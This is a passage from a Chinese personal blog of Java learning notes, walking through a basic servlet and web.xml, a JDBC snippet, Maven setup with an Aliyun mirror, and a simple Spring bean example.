class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String quote;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">TestServlet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"TestServlet constructor called."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"TestServlet init method called"</span>);</span><br><span class="line">        quote=<span class="string">"Thy will , not my will , be done."</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"TestServlet destroy method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        resp.setContentType(<span class="string">"json"</span>);</span><br><span class="line">        PrintWriter out=resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"&#123;\"quote\":\""</span>+quote+<span class="string">"\"&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里顺手写了构造方法看看调用顺序。虽然我们都知道构造方法必然是最先调用的，其次是init(),然后是我们每次访问时调用的doGet,最后destroy销毁。</p><p>然后我们build module。在WEB-INF下的classes中生成TestServlet.class.最后就是配置web.xml了。</p><blockquote><p>默认情况下，Servlet 应用程序位于路径 <Tomcat-installation-directory>/webapps/ROOT 下，且类文件放在 <Tomcat-installation-directory>/webapps/ROOT/WEB-INF/classes 中。<br>如果有一个完全合格的类名称 com.myorg.MyServlet，那么这个 Servlet 类必须位于 WEB-INF/classes/com/myorg/MyServlet.class 中。位于 <Tomcat-installation-directory>/webapps/ROOT/WEB-INF/ 的 web.xml 文件中必须设置Servlet的相关条目。</Tomcat-installation-directory></Tomcat-installation-directory></Tomcat-installation-directory></p></blockquote><p>所以路径结构规定其实非常清晰。接下来我们只需要设置web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>TestServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可设定对应的servlet-class并定义其servletname.同时可以定义这个servlet对应的url映射。</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/21.PNG" alt></p><p>剩下的部分就跟其他语言差不多了,使用get,post等处理参数,cookie及相应http请求。这里稍微记录下sql连接的使用方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String JDBC_DRIVER = <span class="string">"com.mysql.jdbc.Driver"</span>;  </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String DB_URL = <span class="string">"jdbc:mysql://localhost:3306/test"</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String USER = <span class="string">"root"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String PASS = <span class="string">"123456"</span>; </span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">conn = DriverManager.getConnection(DB_URL,USER,PASS);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">mt = conn.createStatement();</span><br><span class="line">String sql;</span><br><span class="line">sql = <span class="string">"SELECT id, name, url FROM websites"</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">rs.close();</span><br><span class="line">stmt.close();</span><br><span class="line">conn.close();</span><br></pre></td></tr></table></figure><h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><p>之前使用ysoserial跟marshalsec时想必必然用过maven了。但是实际上maven的作用究竟是什么还是一头雾水。因此针对maven也来学习下。</p><ul><li>what is maven<br>Maven 翻译为”专家”、”内行”，是 Apache 下的一个纯 Java 开发的开源项目。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。</li></ul><p>Maven 是一个项目管理工具，可以对 Java 项目进行构建、依赖管理。</p><p>环境配置只要jdk+下载maven即可。当然我记得IDEA应该是有maven的功能的。</p><ul><li>POM</li></ul><p>POM 即 project object model.是一个xml文件，同时也是maven工程的基本单元。包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。</p><p>一个pom.xml的demo</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span> = <span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://maven.apache.org/POM/4.0.0</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 模型版本 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.companyname.project-group<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>project<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 版本号 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>常见的节点理解</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/22.PNG" alt></p><ul><li>Super POM<blockquote><p>父（Super）POM是 Maven 默认的 POM。所有的 POM 都继承自一个父 POM（无论是否显式定义了这个父 POM）。父 POM 包含了一些可以被继承的默认设置。因此，当 Maven 发现需要下载 POM 中的 依赖时，它会到 Super POM 中配置的默认仓库 <a href="http://repo1.maven.org/maven2" target="_blank" rel="noopener">http://repo1.maven.org/maven2</a> 去下载。</p></blockquote></li></ul><p>更多pom标签的含义在遇到实际情况再作说明。</p><ul><li>Life Cycle</li></ul><p>Maven 构建生命周期定义了一个项目构建跟发布的过程.其主要的三个生命周期是<code>clean</code>,<code>default/build</code>,<code>site</code>.</p><p>常用命令如<code>mvn clean</code>执行的其实是两个生命周期阶段<code>pre-clean,clean</code>.换成<code>mvn post-clean</code>则会都执行一遍即三个阶段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pre-clean：执行一些需要在clean之前完成的工作</span><br><span class="line">clean：移除所有上一次构建生成的文件</span><br><span class="line">post-clean：执行一些需要在clean之后立刻完成的工作</span><br></pre></td></tr></table></figure><p>我们可以通过控制pom.xml来决定mvn clean时每个阶段的动作。</p><ul><li>maven repos</li></ul><p>maven仓库是项目中依赖的第三方库。其主要是存储jar的地方。因此我们可以构建本地的maven项目。当然也可以有远程与默认的仓库。</p><p>比如使用aliyun仓库。我们可以在maven的setting中更改setting.xml添加节点。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>pom.xml中添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">releases</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">releases</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个可能算是比较重要的一点了。因为大部分idea自带的maven或者是默认下载的maven配置中settings.xml都会去国外仓库获取资源，导致速度奇慢。</p><ul><li>develop</li></ul><p>下面就可以开始正式maven项目的开发了。似乎idea直接创造maven project有一些坑要踩。所以我先按照菜鸟教程上的走。</p><p>在开始之前，先确认把仓库的设置改好了。即选择了aliyun镜像.然后idea的配置中:<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/23.PNG" alt></p><p>然后用命令行构建一个项目。此处我命命为maven_learning</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn archetype:generate &quot;-DgroupId&#x3D;com.byc.test&quot; &quot;-DartifactId&#x3D;mvn_learning&quot; &quot;-DarchetypeArtifactId&#x3D;maven-archetype-quickstart&quot; &quot;-DinteractiveMode&#x3D;false&quot;</span><br></pre></td></tr></table></figure><p>之后在idea中导入这个工程即可。<br>目录结构<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/24.PNG" alt><br>test跟java分别是java代码文件跟测试代码文件。都在包结构下。</p><p>这里我们初始的pom.xml中主要是这样的内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>说明Maven 已经添加了 JUnit 作为测试框架</p><p>初始的App.java是一个Hello world的用例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.byc.test;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println( <span class="string">"Hello World!"</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们需要build maven项目。使用clean package</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package</span><br></pre></td></tr></table></figure><p>成功后。我们会发现生成了target文件夹。并且其中有我们项目构建的jar file。<br>新增目录结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们给了 maven 两个目标，首先清理目标目录（clean），然后打包项目构建的输出为 jar（package）文件。</span><br><span class="line">打包好的 jar 文件可以在target中获得</span><br><span class="line">测试报告存放在surefire-reports文件夹中</span><br><span class="line">Maven 编译源码文件，以及测试源码文件。</span><br><span class="line">接着 Maven 运行测试用例。</span><br><span class="line">最后 Maven 创建项目包。</span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/25.PNG" alt></p><p>classes文件夹下使用<code>java -cp . com.byc.test.App</code>即可调用Hello world.</p><p>这是一个简单的maven项目构建过程。如果要使用外部依赖进行web相关开发,只需依照目录结构进行补充即可。假如我们需要添加一个ldapjdk.jar作为依赖。还是老样子将其拖到工程的lib文件夹下,并在pom.xml中添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 在这里添加你的依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ldapjdk<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  <span class="comment">&lt;!-- 库名称，也可以自定义 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ldapjdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    <span class="comment">&lt;!--库名称，也可以自定义--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!--版本号--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span> <span class="comment">&lt;!--作用域--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;basedir&#125;\src\lib\ldapjdk.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span> <span class="comment">&lt;!--项目根目录下的lib文件夹下--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里一开始想用ideabuild maven项目时发现报错。查了下发现可能是自己jdk版本跟idea的不一致的原因。(为了burp使用jdk1.8,但最早学编程时用的jdk10)所以最好保证maven生成构建项目时的一致性<br>(做htb某靶机中遇到了maven build失败的情况,最后解决办法是在更改了语言level后同时还在pom.xml中加入maven版本,jdk版本才完美解决)</p><h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><p>emm没错又从maven跳到spring了。大概是因为spring框架出现的频率还是算比较高的。并且还不能简单的按照servlet开发的流程理解。所以先学习下spring的基础知识。</p><ul><li>what is spring</li></ul><p>轻量级的Java Web开发框架，以IOC,AOP为内核，使用基本的JavaBean完成以前只可能由EJB完成的工作，取代了EJB臃肿和低效的开发模式。</p><p>spring框架采用分层结构。可分为Data Access/Integration、Web、AOP、Aspects、Messaging、Instrumentation、Core Container和Test。</p><p>其中core container 核心容器包含几个模块</p><blockquote><p>Core模块：提供了框架的基本组成部分，包括IoC和依赖注入功能；<br>Beans模块 ：提供BeanFactory，是工厂模式的经典实现，Spring将管理对象称为Bean；<br>Context模块：是在Core和Beans模块的基础上建立起来的，以一种类似于JNDI注册的方式访问对象，是访问定义和配置任何对象的媒介。ApplicationContext接口是上下文模块的焦点；<br>SpEL模块：提供了强大的表达式语言，用于在运行时查询和操作对象图；</p></blockquote><p>其他如Data Access/Integration 包含jdb，orm等模块。Web包含Servlet,MVC等模块。暂且不提。</p><p>下面还是按照mi1k7ea师傅的流程先做一个简单的spring demo。创建spring项目很简单。idea中创建项目里选择spring后下面选择download选项自动下载依赖。之后就会发现依赖包已经在lib文件夹下了。</p><p>首先src下建包top.bycsec。新建两个类</p><p>HelloWorld</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message  = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Your Message : "</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainApp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"beans.xml"</span>);</span><br><span class="line">        HelloWorld obj = (HelloWorld) context.getBean(<span class="string">"helloWorld"</span>);</span><br><span class="line">        obj.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们使用框架的ClassPathXmlApplicationContext()函数来创建应用程序的上下文。这个API加载beans的配置文件并最终基于所提供的API，它处理创建并初始化所有的对象，即在配置文件中提到的beans</p><p>同时使用已创建的上下文的getBean()方法来获得所需的bean。这个方法使用bean的ID返回一个最终可以转换为实际对象的通用对象。一旦有了对象，你就可以使用这个对象调用任何类的方法；</p><p>那么自然。我们选择加载了beans.xml的配置。所以需要配置beans.xml。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"top.bycsec.HelloWorld"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"byc_404"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此处bean 的id自定。但是必须和获取bean时使用getBean()的参数保持一致。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/26.PNG" alt></p><p>接下来就spring里的几个基础术语学习下</p><ul><li>IOC</li></ul><p>IOC 即 Inversion of Control ,控制反转。指在程序开发中，实例的创建不再由调用者管理，而是由Spring容器创建。Spring容器会负责控制程序之间的关系，而不是由程序代码直接控制，因此控制权由程序代码转移到了Spring容器中，控制权发生了反转，这就是Spring的IoC思想</p><p>Spring容器使用依赖注入（DI）来管理组成一个应用程序的组件。这些对象被称为Spring 